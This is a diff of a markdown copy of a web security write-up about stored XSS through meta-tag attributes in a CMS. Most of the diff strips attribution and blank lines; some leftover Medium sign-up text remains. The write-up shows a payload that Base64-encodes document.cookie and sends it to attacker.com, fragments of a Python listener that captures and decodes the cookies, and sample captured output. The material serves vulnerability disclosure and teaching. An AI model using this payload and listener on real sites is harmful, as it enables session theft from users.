@@ -1,43 +1,30 @@
 # :globe_with_meridians: A simple python listener to capture the exfiltrated cookies
 
-> **Original Source:** [A simple python listener to capture the exfiltrated cookies](https://infosecwriteups.com/chaining-stored-xss-and-csrf-in-typemill-cms-a-deep-dive-into-attribute-injection-909d20edf903)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 ## Triggering the Payload & Exfiltrating Data
 
-
 Since `<meta>` tags are non-visible and head-elements by default, they don't trigger typical interaction events like `onclick`. However, an attacker can trigger them programmatically or chain them with CSS breakout techniques.
-
 
 ## Get Sandiyo Christan’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 For validation, we can trigger the event handlers via the browser console:
-
 
 ```
 document.querySelector('meta[property="og:title"]').onmouseover();
 ```
 
-
 To demonstrate real impact, the payload injected into the `description` tag was designed to read the victim's session cookies, encode them in Base64, and exfiltrate them to an external listener:
-
 
 ```
 fetch('http://attacker.com/?c=' + btoa(document.cookie))
 ```
 
-
 I set up a lightweight Python HTTP receiver (`listener.py`) to capture and automatically decode the exfiltrated cookies:
-
 
 ```
 # A simple python listener to capture the exfiltrated cookies
@@ -45,7 +32,6 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
 import base64
 ```
-
 
 ```
 class RequestHandler(BaseHTTPRequestHandler):
@@ -66,9 +52,7 @@ print(f"[*] Raw 'c': {val}")
 self.wfile.write(b"OK")
 ```
 
-
 Once the event was triggered, the listener successfully intercepted the session details:
-
 
 ```
 [+] Incoming Request Path: /?c=d3Atc2V0dGluZ3MtMT11cmxidXR0b24lM0Rub25lOyB3cC1zZXR0aW5ncy10aW1lLTE9MTc3MzkzMzc2Mw==
@@ -76,6 +60,3 @@ Once the event was triggered, the listener successfully intercepted the session 
 ```
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/chaining-stored-xss-and-csrf-in-typemill-cms-a-deep-dive-into-attribute-injection-909d20edf903). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
